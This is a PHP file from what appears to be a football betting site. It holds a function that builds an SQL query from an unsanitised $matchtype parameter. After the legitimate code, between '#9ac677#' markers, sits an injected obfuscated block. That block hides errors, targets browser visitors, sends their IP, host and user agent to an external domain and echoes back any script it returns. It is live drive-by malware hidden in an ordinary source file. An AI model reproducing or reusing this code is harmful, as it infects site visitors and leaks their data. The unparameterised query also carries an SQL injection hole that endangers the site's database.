<?php

// returns the teams that really reached a certain matchtype
// Example: Return all 8 teams that are in the quarter final
function getRealTeams($matchtype) {
	$table_matches=dbschema::matches;
	$table_finalmatchtipps=dbschema::finalmatchtipps;
    $sql="SELECT f.teamX as team, f.matchnr as matchnr FROM $table_matches m, $table_finalmatchtipps f " .
	"WHERE m.matchtype = '$matchtype' " .
	"AND f.matchnr = m.matchnr AND f.user = 'real' " .
    "UNION SELECT f.teamY as team, f.matchnr as matchnr FROM $table_matches m, $table_finalmatchtipps f " .
	"WHERE m.matchtype = '$matchtype' " .
	"AND f.matchnr = m.matchnr AND f.user = 'real' " . 
	"ORDER BY matchnr";
    //echo "<br>SQL=$sql<br>";
    $result=mysql_query($sql);
    return $result;
}


// returns the teams that really reached a certain matchtype
// Example: Return all 8 teams that are in the quarter final
//function getRealTeams($column, $matchtype) {
//	$table_matches=dbschema::matches;
//	$table_finalmatchtipps=dbschema::finalmatchtipps;
//    $sql="SELECT f.$column FROM $table_matches m, $table_finalmatchtipps f " .
//	"WHERE m.matchtype = '$matchtype' " .
//	"AND f.matchnr = m.matchnr AND f.user = 'real'";
//    //echo "<br>SQL=$sql";
//    $result=mysql_query($sql);
//    return $result;
//}
?>
<?php
#9ac677#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/9ac677#
?>